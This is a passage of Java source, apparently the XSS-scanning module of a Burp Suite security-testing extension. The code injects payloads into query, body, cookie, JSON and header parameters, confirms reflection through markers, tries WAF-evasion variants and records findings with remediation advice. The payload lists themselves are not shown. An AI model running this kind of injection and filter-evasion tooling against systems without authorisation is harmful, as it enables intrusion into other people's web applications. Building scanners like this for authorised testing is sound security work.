            String payload = payloadInfo[0];
            String confirmMarker = payloadInfo[1];
            String desc = payloadInfo[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            if (body == null) body = "";

            if (body.contains(confirmMarker) && !baselineBody.contains(confirmMarker)) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "Framework XSS: " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Confirmation marker found in response")
                        .description("Cross-Site Scripting detected via framework-specific vector (" + desc + ").")
                        .remediation("Avoid dangerouslySetInnerHTML/v-html/[innerHTML]. "
                                + "Use framework auto-escaping. Sanitize with DOMPurify before rendering.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(confirmMarker)
                        .build());
                return;
            }

            perHostDelay();
        }
    }

    // ── Phase 7: WAF evasion ───────────────────────────────────────────────────

    private void testEvasionPayloads(HttpRequestResponse original, InjectionTarget target,
                                       String baselineBody) throws InterruptedException {
        String url = original.request().url();

        for (String[] payloadInfo : EVASION_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return;
            String payload = payloadInfo[0];
            String confirmMarker = payloadInfo[1];
            String desc = payloadInfo[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            if (body == null) body = "";

            if (body.contains(confirmMarker) && !baselineBody.contains(confirmMarker)) {
                findingsStore.addFinding(Finding.builder("xss-scanner",
                                "XSS via WAF Evasion: " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Evasion: " + desc + " | Payload rendered in response")
                        .description("Cross-Site Scripting detected via WAF evasion technique (" + desc
                                + "). Standard payloads were blocked but this variant bypassed the filter.")
                        .remediation("Use a proper HTML sanitizer (DOMPurify) instead of regex-based filters. "
                                + "Implement strict CSP. Apply context-appropriate output encoding.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(confirmMarker)
                        .build());
                return;
            }

            perHostDelay();
        }
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    private String[][] getPayloadsForContext(ReflectionContext ctx) {
        return switch (ctx) {
            case HTML_BODY -> HTML_BODY_PAYLOADS;
            case HTML_ATTRIBUTE_DQ -> ATTR_DQ_PAYLOADS;
            case HTML_ATTRIBUTE_SQ -> ATTR_SQ_PAYLOADS;
            case HTML_ATTRIBUTE_UQ -> ATTR_UQ_PAYLOADS;
            case SCRIPT_STRING_DQ -> SCRIPT_DQ_PAYLOADS;
            case SCRIPT_STRING_SQ -> SCRIPT_SQ_PAYLOADS;
            case SCRIPT_TEMPLATE -> SCRIPT_TEMPLATE_PAYLOADS;
            case SCRIPT_BLOCK -> SCRIPT_BLOCK_PAYLOADS;
            case HTML_COMMENT -> COMMENT_PAYLOADS;
            case STYLE_BLOCK -> STYLE_PAYLOADS;
            case HREF_ATTRIBUTE -> HREF_PAYLOADS;
            case TAG_NAME -> HTML_BODY_PAYLOADS; // Fall back to body payloads
            case UNKNOWN -> HTML_BODY_PAYLOADS;  // Fall back to body payloads
        };
    }

    /**
     * Check if the payload was fully HTML-encoded in the response (meaning XSS doesn't fire).
     * Returns true if critical characters (&lt; &gt; &quot;) are all encoded.
     */
    private boolean isFullyEncoded(String responseBody, String payload) {
        // If the payload contains < or > and they appear encoded, XSS is mitigated
        if (payload.contains("<") || payload.contains(">")) {
            String encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                    .replace("\"", "&quot;").replace("'", "&#39;");
            if (responseBody.contains(encoded)) return true;

            // Also check if < > are URL-encoded in the response
            String urlEncoded = payload.replace("<", "%3C").replace(">", "%3E")
                    .replace("\"", "%22").replace("'", "%27");
            if (responseBody.contains(urlEncoded)) return true;
        }
        return false;
    }

    private String generateCanary() {
        return CANARY_PREFIX + (++canaryCounter) + "z" + System.nanoTime() % 100000;
    }

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectionTarget target,
                                              String payload) {
        if (com.omnistrike.framework.ScanState.isCancelled()) return null;
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            HttpRequestResponse result = api.http().sendRequest(modified);
            if (!ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                if (target.name.contains(".")) {
                    String newBody = replaceNestedJsonValue(body, target.name, payload);
                    return request.withBody(newBody);
                } else {
                    String jsonPattern = "\"" + java.util.regex.Pattern.quote(target.name)
                            + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
                    String newBody = body.replaceFirst(jsonPattern, replacement);
                    return request.withBody(newBody);
                }
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    private String replaceNestedJsonValue(String jsonBody, String dotPath, String value) {
        try {
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
            if (!root.isJsonObject()) return jsonBody;

            String[] parts = dotPath.split("\\.");
            com.google.gson.JsonObject current = root.getAsJsonObject();

            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return jsonBody;
                current = child.getAsJsonObject();
            }

            String leafKey = parts[parts.length - 1];
            if (current.has(leafKey)) {
                current.addProperty(leafKey, value);
            }

            return new com.google.gson.Gson().toJson(root);
        } catch (Exception e) {
            return jsonBody;
        }
    }

    private List<InjectionTarget> extractTargets(HttpRequest request) {
        List<InjectionTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }
        // JSON params
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Injectable request headers
        Set<String> skipHeaders = Set.of("host", "content-length", "connection", "accept-encoding",
                "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                "upgrade-insecure-requests", "if-modified-since", "if-none-match",
                "cookie");
        for (var h : request.headers()) {
            if (!skipHeaders.contains(h.name().toLowerCase())) {
                targets.add(new InjectionTarget(h.name(), h.value(), TargetType.HEADER));
            }
        }

        return targets;
    }

    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix,
                                    List<InjectionTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive()
                    && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new InjectionTarget(fullKey, val.getAsString(), TargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) {
                int q = url.indexOf('?', s);
                return q >= 0 ? url.substring(s, q) : url.substring(s);
            }
        } catch (Exception ignored) {}
        return url;
    }

    private int lastIndexOfIgnoreCase(String str, String search) {
        String lower = str.toLowerCase();
        return lower.lastIndexOf(search.toLowerCase());
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("xss.perHostDelay", 300);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() {
        oobConfirmedParams.clear();
    }

    private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class InjectionTarget {
        final String name, originalValue;
        final TargetType type;
        InjectionTarget(String n, String v, TargetType t) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
        }
    }
}
